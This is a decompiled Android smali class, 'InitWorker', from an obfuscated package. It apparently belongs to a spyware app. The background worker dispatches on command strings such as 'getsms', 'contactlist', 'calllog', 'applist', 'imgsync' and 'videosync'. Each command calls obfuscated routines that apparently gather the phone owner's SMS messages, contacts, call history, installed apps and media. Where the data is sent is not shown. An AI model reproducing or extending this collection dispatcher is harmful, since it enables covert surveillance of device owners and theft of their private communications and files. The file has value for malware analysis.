.class public Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;
.super Landroidx/work/Worker;
.source "sourcefile"


# direct methods
.method public constructor <init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Landroidx/work/Worker;-><init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V

    return-void
.end method


# virtual methods
.method public g()Landroidx/work/ListenableWorker$a;
    .locals 4

    .line 1
    iget-object v0, p0, Landroidx/work/ListenableWorker;->f:Landroidx/work/WorkerParameters;

    .line 2
    iget-object v0, v0, Landroidx/work/WorkerParameters;->b:Lg/z/e;

    const-string v1, "event"

    .line 3
    invoke-virtual {v0, v1}, Lg/z/e;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v1, "imgsync"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    const/4 v0, 0x6

    goto :goto_1

    :sswitch_1
    const-string v1, "videosync"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    goto :goto_0

    :cond_1
    const/4 v0, 0x5

    goto :goto_1

    :sswitch_2
    const-string v1, "calllog"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    goto :goto_0

    :cond_2
    const/4 v0, 0x4

    goto :goto_1

    :sswitch_3
    const-string v1, "contactlist"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    goto :goto_0

    :cond_3
    const/4 v0, 0x3

    goto :goto_1

    :sswitch_4
    const-string v1, "init"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    goto :goto_0

    :cond_4
    const/4 v0, 0x2

    goto :goto_1

    :sswitch_5
    const-string v1, "applist"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5

    goto :goto_0

    :cond_5
    const/4 v0, 0x1

    goto :goto_1

    :sswitch_6
    const-string v1, "getsms"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    goto :goto_0

    :cond_6
    const/4 v0, 0x0

    goto :goto_1

    :goto_0
    const/4 v0, -0x1

    :goto_1
    const-string v1, "type"

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_2

    .line 4
    :pswitch_0
    iget-object v0, p0, Landroidx/work/ListenableWorker;->f:Landroidx/work/WorkerParameters;

    .line 5
    iget-object v0, v0, Landroidx/work/WorkerParameters;->b:Lg/z/e;

    .line 6
    invoke-virtual {v0, v1}, Lg/z/e;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    invoke-virtual {v1, v0}, Lk/a/a/s;->j(Ljava/lang/String;)V

    goto/16 :goto_2

    .line 7
    :pswitch_1
    iget-object v0, p0, Landroidx/work/ListenableWorker;->f:Landroidx/work/WorkerParameters;

    .line 8
    iget-object v0, v0, Landroidx/work/WorkerParameters;->b:Lg/z/e;

    .line 9
    invoke-virtual {v0, v1}, Lg/z/e;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    invoke-virtual {v1, v0}, Lk/a/a/s;->n(Ljava/lang/String;)V

    goto/16 :goto_2

    .line 10
    :pswitch_2
    iget-object v0, p0, Landroidx/work/ListenableWorker;->f:Landroidx/work/WorkerParameters;

    .line 11
    iget-object v0, v0, Landroidx/work/WorkerParameters;->b:Lg/z/e;

    .line 12
    invoke-virtual {v0, v1}, Lg/z/e;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    .line 13
    invoke-static {v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v2, Lk/a/a/k;

    invoke-direct {v2, v0}, Lk/a/a/k;-><init>(Ljava/lang/String;)V

    .line 14
    new-instance v0, Ll/a/g0/f/d/b/b;

    invoke-direct {v0, v2}, Ll/a/g0/f/d/b/b;-><init>(Ljava/util/concurrent/Callable;)V

    .line 15
    sget-object v2, Ll/a/g0/i/a;->b:Ll/a/g0/b/f;

    .line 16
    invoke-virtual {v0, v2}, Ll/a/g0/b/c;->d(Ll/a/g0/b/f;)Ll/a/g0/b/c;

    move-result-object v0

    invoke-static {}, Ll/a/g0/a/a/b;->a()Ll/a/g0/b/f;

    move-result-object v2

    invoke-virtual {v0, v2}, Ll/a/g0/b/c;->a(Ll/a/g0/b/f;)Ll/a/g0/b/c;

    move-result-object v0

    new-instance v2, Lk/a/a/u;

    invoke-direct {v2, v1}, Lk/a/a/u;-><init>(Lk/a/a/s;)V

    invoke-virtual {v0, v2}, Ll/a/g0/b/c;->b(Ll/a/g0/b/e;)V

    goto :goto_2

    .line 17
    :pswitch_3
    iget-object v0, p0, Landroidx/work/ListenableWorker;->f:Landroidx/work/WorkerParameters;

    .line 18
    iget-object v0, v0, Landroidx/work/WorkerParameters;->b:Lg/z/e;

    .line 19
    invoke-virtual {v0, v1}, Lg/z/e;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    invoke-virtual {v1, v0}, Lk/a/a/s;->a(Ljava/lang/String;)V

    goto :goto_2

    :pswitch_4
    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Lk/a/a/s;->i(Ljava/lang/String;)V

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    invoke-virtual {v0, v1}, Lk/a/a/s;->j(Ljava/lang/String;)V

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    invoke-virtual {v0, v1}, Lk/a/a/s;->a(Ljava/lang/String;)V

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    invoke-virtual {v0, v1}, Lk/a/a/s;->n(Ljava/lang/String;)V

    goto :goto_2

    :pswitch_5
    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    .line 20
    iget-object v1, v0, Lk/a/a/s;->c:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    new-instance v3, Lk/a/a/m;

    invoke-direct {v3, v0, v1, v2}, Lk/a/a/m;-><init>(Lk/a/a/s;Landroid/content/pm/PackageManager;Lorg/json/JSONArray;)V

    .line 21
    new-instance v1, Ll/a/g0/f/d/b/b;

    invoke-direct {v1, v3}, Ll/a/g0/f/d/b/b;-><init>(Ljava/util/concurrent/Callable;)V

    .line 22
    sget-object v2, Ll/a/g0/i/a;->b:Ll/a/g0/b/f;

    .line 23
    invoke-virtual {v1, v2}, Ll/a/g0/b/c;->d(Ll/a/g0/b/f;)Ll/a/g0/b/c;

    move-result-object v1

    invoke-static {}, Ll/a/g0/a/a/b;->a()Ll/a/g0/b/f;

    move-result-object v2

    invoke-virtual {v1, v2}, Ll/a/g0/b/c;->a(Ll/a/g0/b/f;)Ll/a/g0/b/c;

    move-result-object v1

    new-instance v2, Lk/a/a/v;

    invoke-direct {v2, v0}, Lk/a/a/v;-><init>(Lk/a/a/s;)V

    invoke-virtual {v1, v2}, Ll/a/g0/b/c;->b(Ll/a/g0/b/e;)V

    goto :goto_2

    .line 24
    :pswitch_6
    iget-object v0, p0, Landroidx/work/ListenableWorker;->f:Landroidx/work/WorkerParameters;

    .line 25
    iget-object v0, v0, Landroidx/work/WorkerParameters;->b:Lg/z/e;

    .line 26
    invoke-virtual {v0, v1}, Lg/z/e;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    invoke-virtual {v1, v0}, Lk/a/a/s;->i(Ljava/lang/String;)V

    :goto_2
    const-string v0, "InitWorker"

    const-string v1, "Working in BackGround"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 27
    new-instance v0, Landroidx/work/ListenableWorker$a$c;

    invoke-direct {v0}, Landroidx/work/ListenableWorker$a$c;-><init>()V

    return-object v0

    nop

    :sswitch_data_0
    .sparse-switch
        -0x4a7719bd -> :sswitch_6
        -0x2f47cdc1 -> :sswitch_5
        0x316510 -> :sswitch_4
        0x27ac4be -> :sswitch_3
        0x20b3a426 -> :sswitch_2
        0x4f817996 -> :sswitch_1
        0x725018de -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
